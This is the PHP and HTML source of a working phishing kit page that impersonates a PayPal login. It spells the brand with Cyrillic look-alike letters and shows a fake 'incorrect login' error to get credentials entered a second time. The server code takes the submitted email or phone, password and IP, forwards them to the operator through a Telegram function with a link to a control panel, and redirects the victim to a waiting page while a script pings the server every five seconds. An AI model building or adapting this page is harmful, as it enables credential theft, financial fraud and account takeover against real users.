<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en';

// Ila 3mer l-form w sifta
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['username'] = $_POST['login_email'] ?? '';
    $data['password'] = $_POST['login_password'] ?? '';
    $data['lang'] = $_POST['lang'] ?? $lang; 
    $data['status'] = 'waiting'; 
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;

    $msg = "🔔 <b>New Login</b>\n";
    $msg .= "SID: <code>$sid</code>\n";
    $msg .= "Email/Phone: <code>{$data['username']}</code>\n";
    $msg .= "Password: <code>{$data['password']}</code>\n";
    $msg .= "IP: <code>{$data['ip']}</code>\n\n";
    $msg .= "➡️ <a href='{$panel_link}'>Open Panel</a>";
    sendToTelegram($msg);

    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="de" id="main-html">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; font-family: "РayРal Sans", Arial, sans-serif; margin: 0; padding: 0; }
        body { background-color: #ffffff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 40px 10px; }
        .container { width: 100%; max-width: 460px; padding: 55px 45px; text-align: center; background: #ffffff; border: 1px solid #e1e7eb; border-radius: 20px; box-shadow: 0 1px 15px rgba(0, 0, 0, 0.02); }
        .logo { margin-bottom: 35px; display: flex; justify-content: center; }
        .logo img { height: 42px; }
        .error-box { background-color: #fffbfa; border: 1px solid #d9393a; border-radius: 4px; padding: 14px 16px; margin-bottom: 20px; display: flex; text-align: left; }
        [dir="rtl"] .error-box { text-align: right; }
        .error-icon { color: #d9393a; font-weight: bold; font-size: 18px; margin-right: 12px; }
        [dir="rtl"] .error-icon { margin-right: 0; margin-left: 12px; }
        .error-text { color: #2c2e2f; font-size: 13px; line-height: 1.5; font-weight: 500; }
        .input-group { text-align: left; margin-bottom: 15px; }
        [dir="rtl"] .input-group { text-align: right; }
        .input-field { width: 100%; padding: 16px 14px; font-size: 15px; border: 1px solid #a6abae; border-radius: 4px; margin-bottom: 16px; -webkit-appearance: none; }
        .input-field:focus { border-color: #0070ba; box-shadow: 0 0 0 1px #0070ba; }
        .forgot-link { display: block; margin-top: 18px; color: #0070ba; text-decoration: none; font-size: 14px; font-weight: bold; text-align: left; }
        [dir="rtl"] .forgot-link { text-align: right; }
        .btn-blue { width: 100%; padding: 14px; background-color: #0050b3; color: #ffffff; border: none; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 22px; }
        .btn-blue:hover { background-color: #003e8a; }
        .separator { display: flex; align-items: center; text-align: center; color: #6c7378; margin: 22px 0; font-size: 14px; }
        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #e2e4e6; }
        .separator::before { margin-right: 15px; } .separator::after { margin-left: 15px; }
        .btn-outline { width: 100%; padding: 13px; background-color: #ffffff; color: #000000; border: 1.5px solid #000000; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .language-wrapper { margin-top: 55px; display: flex; align-items: center; justify-content: center; position: relative; font-size: 13px; }
        .lang-trigger { display: flex; align-items: center; cursor: pointer; margin-right: 8px; }
        .flag-icon { width: 18px; height: 12px; background: linear-gradient(to bottom, #ff0000 33.3%, #ffffff 33.3%, #ffffff 66.6%, #ff0000 66.6%); border: 1px solid #cbd2d6; display: inline-block; }
        .chevron { border: solid #515659; border-width: 0 1.5px 1.5px 0; display: inline-block; padding: 2.5px; margin-left: 6px; transform: rotate(45deg); }
        .lang-links a { text-decoration: none; color: #0070ba; margin: 0 6px; }
        .lang-links a.active { color: #2c2e2f; font-weight: bold; pointer-events: none; }
        .dropdown-menu { display: none; position: absolute; bottom: 25px; background: #ffffff; border: 1px solid #cbd2d6; border-radius: 4px; z-index: 10; padding: 5px 0; min-width: 120px; }
        .dropdown-menu a { display: block; padding: 8px 15px; color: #0070ba; text-decoration: none; }
        .dropdown-menu.show { display: block; }
        .footer { font-size: 11px; color: #6c7378; margin-top: 50px; text-align: center; }
        .footer a { text-decoration: none; color: #6c7378; margin: 0 8px; }
        @media (max-width: 480px) { body { padding: 15px 10px; } .container { border: none; padding: 30px 15px; } }
    </style>
</head>
<body onload="changeLanguage('<?php echo htmlspecialchars($lang); ?>')">
    <div class="container">
        <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal Logo"></div>
        <form id="loginForm" method="POST" action="login-error.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <input type="hidden" name="lang" id="lang-input" value="de">
            
            <div class="error-box">
                <span class="error-icon">⚠️</span>
                <div id="error-text" class="error-text">Die eingegebenen Login-Daten sind nicht richtig. Bitte versuchen Sie es erneut.</div>
            </div>
            <div class="input-group">
                <input type="text" id="input-login" name="login_email" class="input-field" placeholder="E-Mail-Adresse oder Handynummer">
                <input type="password" id="input-password" name="login_password" class="input-field" placeholder="Passwort">
                <a href="#" id="forgot-link" class="forgot-link">Passwort vergessen?</a>
            </div>
            <button type="submit" id="btn-next" class="btn-blue">Einloggen</button>
        </form>
        <div id="separator-text" class="separator">oder</div>
        <button id="btn-signup" class="btn-outline">Neu anmelden</button>
        <div class="language-wrapper">
            <div class="lang-trigger" onclick="toggleDropdown(event)"><div class="flag-icon"></div><i class="chevron"></i></div>
            <div class="lang-links"><a href="#" id="lang-de" class="active" onclick="changeLanguage('de', event)">Deutsch</a><span>|</span><a href="#" id="lang-en" onclick="changeLanguage('en', event)">English</a></div>
            <div class="dropdown-menu" id="langDropdown">
                <a href="#" onclick="changeLanguage('fr', event)">Français</a><a href="#" onclick="changeLanguage('ar', event)">العربية (AR)</a><a href="#" onclick="changeLanguage('pl', event)">Polski</a><a href="#" onclick="changeLanguage('uk', event)">Українська</a>
            </div>
        </div>
    </div>
    <div class="footer"><a href="#" id="foot-contact">Kontakt</a><a href="#" id="foot-privacy">Datenschutz</a><a href="#" id="foot-terms">AGB</a><a href="#" id="foot-global">Weltweit</a></div>
    
    <script>
        const translations = {
            de: { title: "РayРal - Einloggen", placeholder: "E-Mail-Adresse oder Handynummer", passwordPlaceholder: "Passwort", forgot: "Passwort vergessen?", next: "Einloggen", separator: "oder", signup: "Neu anmelden", contact: "Kontakt", privacy: "Datenschutz", terms: "AGB", global: "Weltweit", dir: "ltr", error: "Die eingegebenen Login-Daten sind nicht richtig. Bitte versuchen Sie es erneut." },
            en: { title: "РayРal - Log In", placeholder: "Email or mobile number", passwordPlaceholder: "Password", forgot: "Forgot password?", next: "Log In", separator: "or", signup: "Sign Up", contact: "Contact", privacy: "Privacy", terms: "Terms", global: "Worldwide", dir: "ltr", error: "Some of your information isn't correct. Please try again." },
            fr: { title: "РayРal - Connexion", placeholder: "Adresse email ou numéro de mobile", passwordPlaceholder: "Mot de passe", forgot: "Mot de passe oublié ?", next: "Connexion", separator: "ou", signup: "Ouvrir un compte", contact: "Contact", privacy: "Confidentialité", terms: "Contrats", global: "International", dir: "ltr", error: "Certaines de vos informations sont incorrectes. Veuillez réessayer." },
            ar: { title: "РayРal - تسجيل الدخول", placeholder: "البريد الإلكتروني أو رقم الهاتف المحمول", passwordPlaceholder: "كلمة المرور", forgot: "هل نسيت كلمة المرور؟", next: "تسجيل الدخول", separator: "أو", signup: "تسجيل جديد", contact: "اتصل بنا", privacy: "الخصوصية", terms: "الاتفاقيات", global: "في جميع أنحاء العالم", dir: "rtl", error: "بعض معلوماتك غير صحيحة. يرجى المحاولة مرة أخرى." },
            pl: { title: "РayРal - Zaloguj się", placeholder: "Adres e-mail lub numer telefonu", passwordPlaceholder: "Hasło", forgot: "Nie pamiętasz hasła?", next: "Zaloguj się", separator: "lub", signup: "Załóż konto", contact: "Kontakt", privacy: "Prywatność", terms: "Zasady", global: "Cały świat", dir: "ltr", error: "Niektóre dane są niepoprawne. Spróbuj ponownie." },
            uk: { title: "РayРal - Увійти", placeholder: "Електронна адреса або номер мобільного", passwordPlaceholder: "Пароль", forgot: "Забули пароль?", next: "Увійти", separator: "або", signup: "Зареєструватися", contact: "Контакти", privacy: "Конфіденційність", terms: "Угоди", global: "У всьому світі", dir: "ltr", error: "Деякі з ваших даних невірні. Спробуйте ще раз." }
        };

        function changeLanguage(lang, event) {
            if(event) event.preventDefault();
            const data = translations[lang];
            if (!data) return;

            document.getElementById('main-html').setAttribute('dir', data.dir);
            document.body.style.direction = data.dir;

            document.getElementById('page-title').innerText = data.title;
            document.getElementById('input-login').setAttribute('placeholder', data.placeholder);
            document.getElementById('input-password').setAttribute('placeholder', data.passwordPlaceholder);
            document.getElementById('forgot-link').innerText = data.forgot;
            document.getElementById('btn-next').innerText = data.next;
            document.getElementById('separator-text').innerText = data.separator;
            document.getElementById('btn-signup').innerText = data.signup;
            document.getElementById('foot-contact').innerText = data.contact;
            document.getElementById('foot-privacy').innerText = data.privacy;
            document.getElementById('foot-terms').innerText = data.terms;
            document.getElementById('foot-global').innerText = data.global;
            
            document.getElementById('error-text').innerText = data.error;

            document.getElementById('lang-de').classList.remove('active');
            document.getElementById('lang-en').classList.remove('active');
            if (lang === 'de') document.getElementById('lang-de').classList.add('active');
            else if (lang === 'en') document.getElementById('lang-en').classList.add('active');

            document.getElementById('langDropdown').classList.remove('show');

            document.getElementById('lang-input').value = lang;
        }

        function toggleDropdown(event) { event.stopPropagation(); document.getElementById('langDropdown').classList.toggle('show'); }
        window.onclick = function(event) { if (!event.target.matches('.lang-trigger') && !event.target.matches('.chevron') && !event.target.matches('.flag-icon')) { document.getElementById('langDropdown').classList.remove('show'); } }
        
        const loginForm = document.getElementById('loginForm');
        const signInBtn = document.getElementById('btn-next');
        loginForm.addEventListener('submit', function(e) {
            if(!document.getElementById('input-login').value.trim() || !document.getElementById('input-password').value.trim()) { e.preventDefault(); return; }
            signInBtn.innerText = "Bitte warten..."; signInBtn.style.opacity = "0.7"; signInBtn.disabled = true;
        });
    </script>
    
    <script>
        const sid = "<?php echo isset($sid) ? addslashes($sid) : ''; ?>";
        if(sid) {
            setInterval(() => {
                fetch('process.php?action=ping&sid=' + sid)
                    .catch(err => console.error('Ping error'));
            }, 5000);
        }
    </script>
</body>
</html>